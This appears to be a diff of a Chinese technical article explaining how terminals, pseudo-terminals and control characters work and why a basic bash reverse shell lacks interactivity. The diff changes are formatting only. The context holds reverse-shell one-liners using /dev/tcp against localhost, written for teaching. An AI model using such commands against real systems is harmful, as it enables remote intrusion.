@@ -4,7 +4,9 @@ bash -i </dev/tcp/127.0.0.1/9999
 ```
 这样的shell其实是可以启用nano的，但是交互性并非那么好。这是因为这些命令是需要操纵`tty`的，也就是和终端交互。
 通过`tty`命令再查一下这个反弹的bash，显示`不是一个tty`
+
 ![57446434.png](交互式反弹shell_files/57446434.png)
+
 > 从用户态往下走，先说一下tty命令
 
 ## tty命令
@@ -41,6 +43,7 @@ $ tty
 
 ## tty和tty0和tty1-6
 控制终端`/dev/tty`，本身表示的是当前的`tty设备`，命令行下映射当前正在用的虚拟终端，图形化下则映射正在用的伪终端上。和`console`同级，一个串口对于物理设备来说，实际上会注册两次，一次是`tty`，一次就是`console`。
+
 ![41807105.png](交互式反弹shell_files/41807105.png)
 
 而`/dev/tty0`则是当前虚拟终端的别名，仅限于虚拟终端，且只有`系统/root`能写入，`sudo`不行，因此不管用户当前在使用哪个虚拟终端，只要系统向`/dev/tty0`写入，则在用的虚拟终端也能接收到信息。
@@ -69,6 +72,7 @@ Switch to the 2nd console by pressing Ctrl+Alt+F2. Login as root. Type sleep 5; 
 > 这个是反弹shell中的重点，先粗解
 
 首先是`ttyn`中的一个用来启动`GUI`，这会在`ttyn`终端中画出一个界面，这时候是无终端的，然后窗口系统会模拟出一个终端设备，也就是`仿真终端`
+
 ![57211529.png](交互式反弹shell_files/57211529.png)
 
 `仿真终端`主进程启动，在内核中创建`伪终端`设备对，这个设备对统称`pty`，通过`仿真终端`的皮加上`pty`的骨，就此模拟出一套终端程序，然后通过和`X服务`连接创建`仿真终端`窗口，同时开始接收和处理`X服务`发过来的键鼠事件。
@@ -93,9 +97,11 @@ Switch to the 2nd console by pressing Ctrl+Alt+F2. Login as root. Type sleep 5; 
 ## 反弹shell
 看下`bash反弹`的具体情况
 在`GUI`下的反弹：
+
 ![62142803.png](交互式反弹shell_files/62142803.png)
 
 在`tty`下的反弹：
+
 ![62092639.png](交互式反弹shell_files/62092639.png)
 
 这两种都是第一个的情况，不是一个`tty`，因为这儿所说的`tty`是一个终端环境的意思，很多人说非交互式是缺少了`tty`，可以说是也可以说不是，因为实际上缺少的是`pty`，但是呢`tty`又是一个映射，指的是当前在用的终端设备，所以这么说其实也没什么错。
@@ -108,10 +114,12 @@ Switch to the 2nd console by pressing Ctrl+Alt+F2. Login as root. Type sleep 5; 
 
 
 > 前两个是为程序提供了输入输出模式的帮助，比如输入密码时隐藏字符，后面是提供了对进程的控制，比如控制前台进程的结束，挂机等。
+
 ![3cea415b-3501-4ba7-8303-882bcd000d37.png](交互式反弹shell_files/3cea415b-3501-4ba7-8303-882bcd000d37.png)
 
 详解，历史上有两套伪终端实现，以前是`BSD`，但是后来被放弃了，因为配对出现`master(/dev/ptyn)/slave(/dev/ttyn)`，编程时候需要逐个尝试才能找到终端。现在是`Unix 98`接口，也就是使用`/dev/ptmx`为`master`设备，每次操作都能获得一个`master`的`fd`，并且在`/dev/pts`下创建`slave`设备，而`伪终端驱动`则负责`master`与`slave`的交互。
 特殊控制字符，是指Ctrl和其他键的组合。如Ctrl+C、Ctrl+Z等等。用户按下这些按键，终端模拟器（键盘）会在master端写入一个字节。规则是：Ctrl+字母得到的字节是（大写）字母的ascii码减去0x40。比如Ctrl+C是0x03，Ctrl+Z是0x1A。参见下表：
+
 ![2e696b44-8af0-4f61-8cae-0e19256c9526.png](交互式反弹shell_files/2e696b44-8af0-4f61-8cae-0e19256c9526.png)
 
 `驱动`会对这些字符进行处理，然后部分控制字符被拦截，然后向前台进程组发送信号。比如反弹shell中的`上`，会变成`^[[A`，就是因为没有驱动去处理，直接输出了。
@@ -122,9 +130,11 @@ Switch to the 2nd console by pressing Ctrl+Alt+F2. Login as root. Type sleep 5; 
 bash -i >/dev/tcp/127.0.0.1/9999 <&1 2<&1
 ```
 获取一个非交互的shell，此时的模型是这样的，单纯的直连，`bash`进程从`nc`接收输入，执行后把输出传给`nc`。
+
 ![73874827.png](交互式反弹shell_files/73874827.png)
 
 一个合理的`交互式反弹shell`模型情况应该是这样的：
+
 ![74468493.png](交互式反弹shell_files/74468493.png)
 
 说白了就是实现`针对信号的处理进行作业调度`。但是实际上并非那么好实现，就是要新实现一个`pty`，而且还有一个问题就是，我们自己的`pty`的`驱动`会先处理我们`特殊控制字符`。
@@ -159,6 +169,7 @@ write(1,buf,MAXDATASIZE);
 }
 ```
 至此程序模型如下：
+
 ![51771192.png](交互式反弹shell_files/51771192.png)
 
 这儿的问题就是：
